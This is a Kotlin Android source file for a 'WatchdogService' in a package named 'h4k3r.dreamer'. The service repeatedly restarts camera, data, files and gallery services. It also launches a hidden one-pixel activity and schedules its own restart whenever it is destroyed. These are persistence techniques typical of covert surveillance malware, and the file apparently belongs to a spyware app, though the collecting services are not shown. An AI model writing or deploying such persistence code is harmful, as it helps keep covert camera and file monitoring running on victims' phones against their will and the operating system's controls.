package com.h4k3r.dreamer

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit

class WatchdogService : Service() {
    companion object {
        private const val TAG = "WatchdogService"
        private const val CHECK_INTERVAL = 60L // Increased to 60 seconds to reduce restart frequency
        
        // Flag to track if service is running
        @Volatile
        var isServiceRunning = false
    }

    private lateinit var scheduler: ScheduledExecutorService
    private val restartAttempts = mutableMapOf<String, Int>()
    private val maxRestartAttempts = 3 // Reduced from 5 to 3
    private val backoffTimes = mutableMapOf<String, Long>() // Track backoff times
    private val baseBackoffTime = 300_000L // 5 minutes base backoff

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "WatchdogService created")
        
        // Set the running flag
        isServiceRunning = true
        
        scheduler = Executors.newScheduledThreadPool(1)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "WatchdogService started")
        
        // Start periodic checking
        scheduler.scheduleAtFixedRate({
            checkAndRestartServices()
        }, 0, CHECK_INTERVAL, TimeUnit.SECONDS)

        return START_STICKY
    }

    private fun checkAndRestartServices() {
        try {
            Log.d(TAG, "Checking services...")
            val currentTime = System.currentTimeMillis()
            
            // Check all services with backoff logic
            val services = listOf(
                CameraService::class.java,
                DataService::class.java,
                FilesService::class.java,
                GalleryService::class.java
                // Removed PermissionMonitorService to prevent restart loops
            )

            services.forEach { serviceClass ->
                val name = serviceClass.simpleName
                
                // Check if service is in backoff period
                val backoffUntil = backoffTimes.getOrDefault(name, 0L)
                if (currentTime < backoffUntil) {
                    Log.d(TAG, "$name is in backoff period until ${(backoffUntil - currentTime) / 1000}s")
                    return@forEach
                }
                
                if (!isServiceRunning(serviceClass)) {
                    val attempts = restartAttempts.getOrDefault(name, 0)
                    if (attempts < maxRestartAttempts) {
                        Log.d(TAG, "$name not running, restarting... (attempt ${attempts + 1})")
                        try {
                            val intent = Intent(this, serviceClass)
                            startService(intent)
                            restartAttempts[name] = attempts + 1
                            
                            // If this is the last attempt, set a long backoff
                            if (attempts + 1 >= maxRestartAttempts) {
                                val backoffTime = baseBackoffTime * (attempts + 1)
                                backoffTimes[name] = currentTime + backoffTime
                                Log.w(TAG, "$name reached max attempts, backing off for ${backoffTime / 60000} minutes")
                            }
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to restart $name", e)
                            // Set immediate backoff on exception
                            backoffTimes[name] = currentTime + (baseBackoffTime / 2)
                        }
                    } else {
                        Log.w(TAG, "$name failed to start $maxRestartAttempts times, in backoff period")
                    }
                } else {
                    // Service is running, reset counters
                    restartAttempts[name] = 0
                    backoffTimes.remove(name)
                }
            }
            
            // Reduced OnePixelActivity usage to prevent excessive activity starts
            if (android.os.Build.VERSION.SDK_INT < 31 && currentTime % (5 * 60 * 1000) == 0L) { // Only every 5 minutes
                try {
                    val activityIntent = Intent(this, OnePixelActivity::class.java)
                    activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(activityIntent)
                } catch (e: Exception) {
                    Log.d(TAG, "OnePixelActivity start failed: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error in service check", e)
        }
    }

    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        val manager = getSystemService(ACTIVITY_SERVICE) as android.app.ActivityManager
        val runningServices = manager.getRunningServices(Integer.MAX_VALUE)
        return runningServices.any { it.service.className == serviceClass.name }
    }

    override fun onDestroy() {
        // Clear the running flag
        isServiceRunning = false
        
        Log.d(TAG, "WatchdogService destroyed")
        
        // Shutdown scheduler properly
        try {
            scheduler.shutdown()
            if (!scheduler.awaitTermination(5, java.util.concurrent.TimeUnit.SECONDS)) {
                scheduler.shutdownNow()
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error shutting down scheduler: ${e.message}")
            scheduler.shutdownNow()
        }
        
        super.onDestroy()
        
        // Only restart if not being destroyed due to system cleanup
        // Add delay to prevent immediate restart loops
        android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
            try {
                if (!isServiceRunning) { // Double check
                    val intent = Intent(this, WatchdogService::class.java)
                    startService(intent)
                    Log.d(TAG, "WatchdogService restart scheduled")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restart WatchdogService: ${e.message}")
            }
        }, 30000) // 30 second delay
    }

    override fun onBind(intent: Intent?): IBinder? = null
}